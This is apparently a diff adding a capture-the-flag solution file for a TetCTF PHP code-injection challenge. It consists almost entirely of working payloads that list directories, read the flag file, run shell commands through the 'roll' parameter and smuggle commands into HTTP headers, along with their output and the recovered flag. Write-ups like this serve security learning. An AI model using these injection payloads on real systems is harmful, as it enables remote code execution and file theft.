@@ -1,0 +1,148 @@
+passthru(ls)
+	fl4g_here_but_can_you_get_it_hohoho.php
+	index.php
+
+
+# Solution 1
+var_dump(scandir(getcwd()))._
+	array(4) {
+	  [0]=>
+	  string(1) "."
+	  [1]=>
+	  string(2) ".."
+	  [2]=>
+	  string(39) "fl4g_here_but_can_you_get_it_hohoho.php"
+	  [3]=>
+	  string(9) "index.php"
+	}
+
+
+roll=readfile(next(array_reverse(scandir(__DIR__))))
+
+
+# Solution 2
+var_dump(array_keys(realpath_cache_get()))
+	array(6) {
+	  ["/var/www/html/index.php"]=>
+	  array(4) {
+	    ["key"]=>
+	    int(5608493233302765602)
+	    ["is_dir"]=>
+	    bool(false)
+	    ["realpath"]=>
+	    string(23) "/var/www/html/index.php"
+	    ["expires"]=>
+	    int(1609655554)
+	  }
+	  ["/var/www/html"]=>
+	  array(4) {
+	    ["key"]=>
+	    int(1438560323331296433)
+	    ["is_dir"]=>
+	    bool(true)
+	    ["realpath"]=>
+	    string(13) "/var/www/html"
+	    ["expires"]=>
+	    int(1609655554)
+	  }
+	  ["/var/www"]=>
+	  array(4) {
+	    ["key"]=>
+	    float(1.5408950988325E+19)
+	    ["is_dir"]=>
+	    bool(true)
+	    ["realpath"]=>
+	    string(8) "/var/www"
+	    ["expires"]=>
+	    int(1609655554)
+	  }
+	  ["/var"]=>
+	  array(4) {
+	    ["key"]=>
+	    float(1.6710127960665E+19)
+	    ["is_dir"]=>
+	    bool(true)
+	    ["realpath"]=>
+	    string(4) "/var"
+	    ["expires"]=>
+	    int(1609655554)
+	  }
+	  ["/var/www/html/fl4g_here_but_can_you_get_it_hohoho.php"]=>
+	  array(4) {
+	    ["key"]=>
+	    int(1354799033464480186)
+	    ["is_dir"]=>
+	    bool(false)
+	    ["realpath"]=>
+	    string(53) "/var/www/html/fl4g_here_but_can_you_get_it_hohoho.php"
+	    ["expires"]=>
+	    int(1609649465)
+	  }
+	  ["/var/www/html/./fl4g_here_but_can_you_get_it_hohoho.php"]=>
+	  array(4) {
+	    ["key"]=>
+	    float(1.6439130098565E+19)
+	    ["is_dir"]=>
+	    bool(false)
+	    ["realpath"]=>
+	    string(53) "/var/www/html/fl4g_here_but_can_you_get_it_hohoho.php"
+	    ["expires"]=>
+	    int(1609652545)
+	  }
+	}
+
+var_dump(array_keys(realpath_cache_get()))
+	array(7) {
+	  [0]=>
+	  string(23) "/var/www/html/index.php"
+	  [1]=>
+	  string(25) "/var/www/html/./index.php"
+	  [2]=>
+	  string(13) "/var/www/html"
+	  [3]=>
+	  string(8) "/var/www"
+	  [4]=>
+	  string(4) "/var"
+	  [5]=>
+	  string(53) "/var/www/html/fl4g_here_but_can_you_get_it_hohoho.php"
+	  [6]=>
+	  string(55) "/var/www/html/./fl4g_here_but_can_you_get_it_hohoho.php"
+	}
+
+
+readfile(end(array_keys(realpath_cache_get())))
+	<?php
+
+	$flagsssssssss = "TetCTF{lixi_50k_<3_vina_*100*25926415724382#}";
+
+	?>
+
+
+
+########## Other Solution ##########
+
+1. Use getallheaders()
+
+GET /?roll=readfile(end(getallheaders())) HTTP/1.1
+Host: 192.46.227.32
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: */ eval(system('ls'));/*
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+a: fl4g_here_but_can_you_get_it_hohoho.php
+
+
+2. Use array_rand
+
+readfile(array_rand(array_flip(scandir(__DIR__))))
+
+3. Use getenv
+
+GET /?roll=system(getenv(HTTP_test)) HTTP/1.1
+test: cat fl4g_here_but_can_you_get_it_hohoho.php
+
+4. Use get_defined_vars()
+GET /?test=ls&roll=system(pos(pos(get_defined_vars())))
